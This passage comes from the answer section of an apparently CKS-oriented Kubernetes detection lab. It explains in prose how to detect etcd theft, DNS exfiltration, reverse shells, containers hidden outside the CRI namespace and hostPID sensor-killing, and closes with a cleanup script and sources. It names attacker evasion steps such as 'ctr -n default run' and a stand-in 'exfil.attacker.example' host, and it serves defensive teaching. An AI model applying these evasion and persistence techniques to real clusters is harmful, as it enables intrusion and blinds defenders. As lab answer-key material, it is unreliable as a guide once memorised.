**A5.4 —** (a) **Copy the raw data files.** `cp -a /var/lib/etcd /tmp/x` or `tar` the directory — a `bbolt` database file is a complete, portable copy of cluster state. Caught by `Etcd Data Directory Accessed By Non-Etcd Process` (Falco) and by the `-w /var/lib/etcd/ -p rwa -k etcd_data` `auditd` watch from Exercise 2. (b) **Query the etcd API directly with the stolen client certificates**, using any etcd client rather than the `etcdctl` binary — a small Go program, or `curl` against the gRPC gateway. The `Etcd Snapshot Taken` rule matching `proc.name in (etcdctl, etcdutl)` misses this entirely; what still catches it is the `-w /etc/kubernetes/pki/ -p rwa -k k8s_pki` watch, because any such client must first **read the client key**, plus the etcd data-directory rule if they take the file route. The general lesson: rules keyed on **process names** are evadable by renaming or reimplementing; rules keyed on **the resources the attack must touch** — the key file, the data directory — are not.

---

### Exercise 6 — Network

**A6.1 —** Because DNS is the one egress path that is almost always permitted, by necessity: every Kubernetes workload must resolve Service names, so a default-deny egress policy that would otherwise be airtight still needs the `allow-dns` exception you wrote. Attackers know this, which is why DNS carries C2 beaconing and data exfiltration when nothing else gets out. And DNS is exceptionally high-signal: queries are short, text-based, name the destination explicitly, and are centrally logged at CoreDNS regardless of CNI, so one configuration change gives you cluster-wide coverage. Tunnelling has a loud statistical signature — dozens to thousands of unique subdomains under one parent, unusually long labels, base32/base64 character distributions, high `TXT`/`NULL` query ratios, steady query timing. Note also what `allow-dns` does **not** restrict: it permits queries for *any* name, including `exfil.attacker.example`. Restricting the names themselves requires an L7-aware policy (Cilium `toFQDNs`) or a CoreDNS forwarding/blocklist policy.

**A6.2 —** A drop tells you two different things, and only one of them is about the network. The packet was blocked, yes — but a workload attempting a connection it has never legitimately needed is evidence that **the workload's behaviour has changed**, which usually means it has been compromised. The policy stopped the exfiltration; it did nothing about the RCE that caused the attempt, the attacker still has code execution in that Pod, and they will now try a path that *is* allowed. Prevention and detection answer different questions: prevention asks "did this succeed?", detection asks "what does this tell me about the state of my system?". Dropped flows from a default-deny namespace are one of the cleanest low-false-positive detections available, precisely *because* the policy makes normal traffic explicit — everything else is by definition anomalous.

**A6.3 —** (a) **A CNI with built-in flow observability**: Cilium/Hubble records a verdict for every flow (`hubble observe --verdict DROPPED`), and Calico offers `action: Log` in `GlobalNetworkPolicy`, emitting to the kernel log via iptables NFLOG. Dependency: you are tied to that specific CNI and its version, and Hubble adds a control plane (Hubble Relay, retention, storage) that must itself be operated and secured. (b) **Node-level packet or connection capture** — `tcpdump`/`conntrack` inside the Pod's network namespace via `nsenter`, or an eBPF sensor such as Falco's `inbound`/`outbound` macros or Tetragon. Dependency: you see packets and sockets but **not the policy verdict** — you cannot distinguish "dropped by NetworkPolicy" from "connection refused" or "route unreachable" without inferring it, and capture-everything on a busy node is expensive. Neither is free, and core Kubernetes gives you neither by default, which is why the network layer is the most commonly unmonitored one on the list.

**A6.4 —** Because the rule matches on the **`dup`/`dup2`/`dup3` syscall** — the act of duplicating a network file descriptor onto file descriptors 0, 1 or 2 — not on which binary ran. `bash`'s `/dev/tcp/host/port` is a shell built-in: bash opens the socket itself and never `execve`s `nc`, `socat` or anything else, so a rule on `proc.name in (nc, ncat, socat)` sees nothing. But *every* reverse shell, regardless of implementation language or binary, must ultimately connect its standard I/O to a socket so the remote end can drive it — and on Linux that means `dup2(sockfd, 0/1/2)`. This is the difference between an **indicator-based** rule (a name, a hash, an IP — evadable by changing that one attribute) and a **behaviour-based** rule (a required step in the technique — evadable only by finding a different technique). Behaviour rules are the whole point of syscall-level detection; when you write a Falco rule, always ask what the attacker *must* do rather than what they *typically* do.

---

### Exercise 7 — Workloads

**A7.1 —** containerd partitions its state into **namespaces** (`ctr namespaces list`). The kubelet talks to containerd over the CRI, which is hard-wired to the `k8s.io` namespace, so `crictl ps` — which is a CRI client — can only ever see containers in `k8s.io`. A container created with `ctr -n default run ...` lives in a different containerd namespace and is invisible to `crictl`, to the kubelet, and therefore to the entire Kubernetes API. Nothing in the Kubernetes control plane applies to it: admission controllers only run on API requests and this container was never an API request; Pod Security Admission evaluates Pod specs and there is no Pod object; NetworkPolicy selects Pods by label and there is no Pod to select; resource quotas, PriorityClasses, image policy webhooks and the scheduler are all equally bypassed. It is a plain Linux container with full access to the node, and your only detection paths are node-level: `ctr` enumeration across all namespaces, cgroup comparison against `kubepods.slice`, process-tree inspection, and syscall monitoring. This is the standard post-exploitation move after any container escape or node compromise, and it is the reason `crictl ps` alone is an inadequate answer to "what is running on this node?".

**A7.2 —** When the kubelet starts a Pod from a manifest in `--pod-manifest-path` (a **static Pod**), it creates a read-only **mirror Pod** object in the API so the Pod is visible to `kubectl`. The mirror Pod's `ownerReferences` point at the **Node**, not at a ReplicaSet, DaemonSet or Job — that is the fingerprint you filtered on, and it is why a static-Pod backdoor is not actually invisible: `kube-apiserver`, `kube-scheduler`, `kube-controller-manager` and `etcd` are legitimately in this category, so anything *else* owned by a Node is worth investigating. To defeat exactly that check, an attacker skips the kubelet entirely and starts their container directly through the runtime (`ctr -n default run`, as in Q7.1) — no manifest file, so no `auditd` `k8s_static_pod` event and no AIDE delta; no kubelet involvement, so no mirror Pod and no API record. Their remaining exposures are cgroup/process inspection and the syscall sensor. Layered detection is not redundancy; each layer covers the evasion of the one above it.

**A7.3 —** `hostPID: true` puts the container in the **host's PID namespace**, so it can see and signal every process on the node — including your sensors. Concretely, the attacker can `kill` the Falco process or its `falco-modern-bpf` service, `kill` `auditd`, read `/proc/<pid>/` of any process to steal credentials and environment variables from memory (kubelet's kubeconfig, etcd client key paths, other workloads' tokens), and use `/proc/1/root` to reach the host filesystem without needing a `hostPath` mount at all. It converts a workload-layer compromise into direct control over the node's detection stack — the attacker can go blind-spot-first. This is why `hostPID: true` outside a small, explicitly-approved set of system DaemonSets should be treated as a critical finding in its own right, why a sensor watchdog that alerts on sensor *absence* is mandatory, and why "no alerts" is never by itself evidence of "no attack".

**A7.4 —** No. Deleting the manifest removes the *mechanism you found*; it says nothing about what the attacker did while it ran, or about what else they left. Before calling the node clean you must check: (1) whether the Pod ran as privileged with `/` mounted — assume full node compromise and treat every credential on the node as stolen, including the kubelet kubeconfig, every mounted ServiceAccount token, and any PKI material; (2) SSH persistence — `/root/.ssh/authorized_keys` and every user's, plus `sshd` config drop-ins; (3) other persistence — systemd units and timers, `/etc/cron*`, `/etc/rc.local`, shell profiles, `LD_PRELOAD` in `/etc/ld.so.preload`; (4) containers outside the CRI namespace (Q7.1) and any loaded kernel modules (`lsmod`, the `kernel_modules` audit key); (5) a full AIDE check against a **known-good, off-node** database; (6) the API audit log for what the stolen credentials did *cluster-wide* — a node compromise with a privileged token is a cluster compromise until proven otherwise; (7) whether the attacker re-baselined AIDE or flushed audit rules. In practice the defensible action for a node you believe was root-compromised is to cordon, drain, **rebuild it from a known-good image**, and rotate every credential that was resident on it. You cannot clean a host with the tools that host is running.

---

### Exercise 8 — Capstone

**A8.1 —** `sourceIPs` records the network peer as the API server observed it, which is the last hop, not the human or the workload. Because a bearer token can be replayed from anywhere, an attacker who exfiltrates a token and uses it from a jump host, from the control-plane node, from their laptop through a tunnel, or from behind a NAT will present whatever address that path produces. Treat `sourceIPs` as **corroborating** evidence — powerful when it *contradicts* the expected location ("this Pod's SA is calling from an address that is not this Pod") and weak as positive attribution. What stays reliable is the cryptographically verified `user.username`/`user.uid`/`user.groups`: the API server proved the caller possessed that credential. So attribution answers "which credential", not "which person or process" — which is precisely why short-lived audience-bound tokens, per-workload ServiceAccounts, and the User-Agent baseline of A4.5 matter: they shrink the ambiguity that `sourceIPs` cannot resolve.

**A8.2 —** The API audit log covers exactly the actions that **transit the API server**, and stops the moment the attacker obtains execution *inside* something the API server already granted. Creating the privileged Pod was an API request, so it was logged in full. Everything the attacker then did with that Pod — writing to `/host/root/.ssh/authorized_keys`, reading the node's filesystem, inspecting other containers' `/proc`, starting a container outside the CRI namespace, connecting outbound — happened entirely on the node and never touched the API server. This gives you the rule: **the API audit log is a perfect record of the attacker's requests and a blind spot for their consequences.** It answers "how did they get the capability?" and never "what did they do with it?". The Pod-creation event is therefore the *pivot*: the instant you see a privileged / `hostPID` / `hostPath: /` Pod created by an unexpected identity, you must switch to node-level sources — `auditd`, Falco, AIDE, `ctr` — because the API will tell you nothing more. Alerting on the creation event is worth more than alerting on anything downstream, since it is the last moment the cheap, centralised sensor can still see the attacker.

**A8.3 —** *For fixing it:* discovery is a genuine attack phase (T1613), it is the earliest point in the chain where you could act, and a Falco rule for reading `/proc/self/environ`, `/etc/resolv.conf` or the `KUBERNETES_SERVICE_HOST` variables inside a container is trivial to write. *Against:* those exact reads are what every application does at startup — service discovery, DNS configuration, SDK initialisation — so the rule fires continuously across every Pod in the cluster with a false-positive rate that will get all Falco alerts muted within a week, which costs you the CRITICAL detections that were working. **Engineering decision:** do not alert on it. Log it, and use it only as *correlation context* — the discovery reads become interesting when they appear within seconds of a `pods/exec` event or a SA token read, never on their own. A detection whose volume causes responders to stop reading the channel is negative value; the correct home for low-precision, high-recall signals is enrichment and retrospective hunting, not paging. Precision at the alerting tier is a resource you spend, and you should spend it on steps 3, 5, 6 and 7, where the base rate of benign activity is near zero.

**A8.4 —** (a) **Centralised, time-synchronised, tamper-evident collection.** Every sensor ships to one append-only destination the compromised nodes cannot delete from — API audit via `--audit-webhook-config-file`, Falco via falcosidekick/`http_output`, `auditd` via `audisp-remote`, AIDE reports pushed out — with NTP enforced on every node so timestamps are comparable to the second. Without this, correlating five sources across three hosts means SSHing into hosts the attacker may control, reading logs they may have truncated, and reconciling clocks that drift; and the evidence-destruction techniques from A1.3, A2.4 and A4.6 all still work. (b) **A common identity/correlation key across sources.** Falco emits `k8s.ns.name`/`k8s.pod.name`/`container.id`, the audit log emits `objectRef.namespace`/`objectRef.name`/`user.username`, and `auditd` emits `auid`/`pid`/`comm` — nothing joins them automatically. Normalising to shared fields (Pod UID, container ID, node name, ServiceAccount) at ingestion is what turns seven disconnected alerts into one incident. Neither change is "install more rules" because your rule coverage in this lab was already sufficient — every phase except the deliberately-excluded discovery step produced evidence. What failed was **evidence survivability and evidence joinability**. Detection engineering maturity is measured by how fast you can answer "what happened", not by how many rules you have loaded; adding rules to a system with no reliable collection and no correlation key just adds more places to look by hand while the attacker still holds the disk your evidence sits on.

</details>

---

## Cleanup

```bash
kubectl delete ns prod sre-debug --ignore-not-found
kubectl delete clusterrolebinding rogue-admin --ignore-not-found
kubectl -n kube-system apply -f /tmp/coredns.bak.yaml && kubectl -n kube-system rollout restart deploy coredns

ssh cks-w1 'sudo rm -f /etc/falco/rules.d/cks-6.2-*.yaml; sudo systemctl restart falco-modern-bpf'
ssh cks-cp 'sudo rm -f /etc/kubernetes/manifests/kube-sysmon.yaml; sudo sed -i "/Probe/d" /root/.ssh/authorized_keys'
# Keep /etc/audit/rules.d/70-cks-threats.rules and the audit policy - they are the deliverable.
```

To revert the API server, restore `/root/kube-apiserver.yaml.bak` **into** `/etc/kubernetes/manifests/` with `sudo cp`, never by editing in place with a tool that leaves swap files there.

---

## Sources

- CNCF, *Certified Kubernetes Security Specialist (CKS) Curriculum v1.34* — https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
- Kubernetes, *Auditing* — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- Kubernetes, *Audit Configuration API (audit.k8s.io/v1)* — https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/
- Kubernetes, *kube-apiserver command-line reference* — https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/
- Kubernetes, *Kubelet authentication/authorization* — https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/
- Kubernetes, *Encrypting Confidential Data at Rest* — https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/
- Kubernetes, *Static Pods* — https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/
- Falco, *Documentation* — https://falco.org/docs/
- Falco, *falcosecurity/rules* (default rule set and macros) — https://github.com/falcosecurity/rules
- Falco, *k8saudit plugin* — https://github.com/falcosecurity/plugins/tree/main/plugins/k8saudit
- Linux man-pages, *auditctl(8)* — https://man7.org/linux/man-pages/man8/auditctl.8.html
- Linux man-pages, *ausearch(8)* — https://man7.org/linux/man-pages/man8/ausearch.8.html
- AIDE, *Advanced Intrusion Detection Environment* — https://aide.github.io/
- Cilium, *Hubble observability* — https://docs.cilium.io/en/stable/observability/hubble/
- CoreDNS, *log plugin* — https://coredns.io/plugins/log/
- MITRE ATT&CK, *Containers Matrix* — https://attack.mitre.org/matrices/enterprise/containers/
- CIS, *Kubernetes Benchmark* — https://www.cisecurity.org/benchmark/kubernetes